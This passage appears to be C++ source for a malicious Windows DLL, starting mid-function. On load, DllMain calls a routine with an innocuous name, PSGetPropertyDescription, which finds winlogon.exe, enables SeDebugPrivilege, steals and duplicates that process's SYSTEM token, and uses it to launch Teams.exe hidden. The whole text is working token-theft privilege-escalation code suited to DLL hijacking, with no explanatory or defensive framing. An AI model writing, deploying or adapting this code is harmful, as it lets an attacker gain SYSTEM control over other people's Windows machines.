	GetTokenInformation(TokenHandle, TokenUser, pTokenUser, ReturnLength, &ReturnLength);

	wchar_t* userSid = NULL;
	ConvertSidToStringSid(pTokenUser->User.Sid, &userSid);
	std::string sid = wcharToString(userSid);

	TCHAR szGroupName[256];
	TCHAR szDomainName[256];

	DWORD cchGroupName = 256;
	DWORD cchDomainName = 256;

	LookupAccountSid(NULL, pTokenUser->User.Sid, szGroupName, &cchGroupName, szDomainName, &cchDomainName, &SidType);

	std::wcout << "[+] Current SID: " << szDomainName << "\\" << szGroupName << " @ ";

	std::cout << sid << std::endl;;

}

int LocateWinLogonProcess()
{

	DWORD lpidProcess[PROCESS_ARRAY], lpcbNeeded, cProcesses;

	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	int processWinlogonPid;

	if (Process32First(hSnapshot, &p32))
	{
		do {
			if (wcharToString(p32.szExeFile) == "winlogon.exe")
			{
				std::cout << "[+] Located winlogon.exe by process name (PID " << p32.th32ProcessID << ")" << std::endl;
				processWinlogonPid = p32.th32ProcessID;

				return processWinlogonPid;
				break;
			}
		} while (Process32Next(hSnapshot, &p32));

		CloseHandle(hSnapshot);
	}
}

void EnableSeDebugPrivilegePrivilege()
{
	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());

	if (currentProc)
	{
		HANDLE TokenHandle(NULL);
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken)
		{
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

			if (!checkToken)
			{
				std::cout << "[+] Current process token already includes SeDebugPrivilege\n" << std::endl;
			}
			else
			{
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0)
				{
					std::cout << "[+] Added SeDebugPrivilege to the current process token" << std::endl;
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);
}

BOOL CreateImpersonatedProcess(HANDLE NewToken)
{
	wchar_t* w_app_data_path;
	size_t sz = 0;
	errno_t err = _wdupenv_s(&w_app_data_path, &sz, L"LOCALAPPDATA");
	wchar_t cmdArgs[2048]{ 0 };
	wsprintfW(cmdArgs, L"%s\\Microsoft\\Teams\\current\\Teams.exe", w_app_data_path);
	free(w_app_data_path);

	bool NewProcess;

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);
	lpStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	lpStartupInfo.wShowWindow = SW_HIDE;

	NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, cmdArgs, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &lpStartupInfo, &lpProcessInformation);
	if (!NewProcess)
	{
		std::cout << "[!] Failed to create a new process with the stolen TOKEN" << std::endl;
		return -1;
	}

	std::cout << "[+] Created a new process with the stolen TOKEN" << std::endl;

	GetTokenInfo(NewToken);

	CloseHandle(NewToken);
}

BOOL StealToken(int TargetPID)
{
	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	BOOL OpenToken;
	BOOL Impersonate;
	BOOL Duplicate;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPID);

	if (!hProcess)
	{
		std::cout << "[!] Failed to obtain a HANDLE to the target PID" << std::endl;
		return -1;
	}

	std::cout << "[+] Obtained a HANDLE to the target PID" << std::endl;

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);

	if (!OpenToken)
	{
		std::cout << "[!] Failed to obtain a HANDLE to the target TOKEN" << std::endl;
		std::cout << GetLastError();
	}

	std::cout << "[+] Obtained a HANDLE to the target TOKEN" << std::endl;

	Impersonate = ImpersonateLoggedOnUser(TokenHandle);

	if (!Impersonate)
	{
		std::cout << "[!] Failed to impersonate the TOKEN's user" << std::endl;
		return -1;
	}

	std::cout << "[+] Impersonated the TOKEN's user" << std::endl;

	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);

	if (!Duplicate)
	{
		std::cout << "[!] Failed to duplicate the target TOKEN" << std::endl;
		return -1;
	}

	std::cout << "[+] Duplicated the target TOKEN" << std::endl;

	CreateImpersonatedProcess(NewToken);

	CloseHandle(hProcess);
	CloseHandle(TokenHandle);
}

void CheckCurrentProcess()
{
	HANDLE TokenHandle = NULL;
	HANDLE hCurrent = GetCurrentProcess();
	OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);

	GetTokenInfo(TokenHandle);

	CloseHandle(TokenHandle);
}

int PSGetPropertyDescription()
{
	CheckCurrentProcess();
	int winLogonPID = LocateWinLogonProcess();
	EnableSeDebugPrivilegePrivilege();
	StealToken(winLogonPID);

	return 0;
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        PSGetPropertyDescription();
    }
    return TRUE;
}
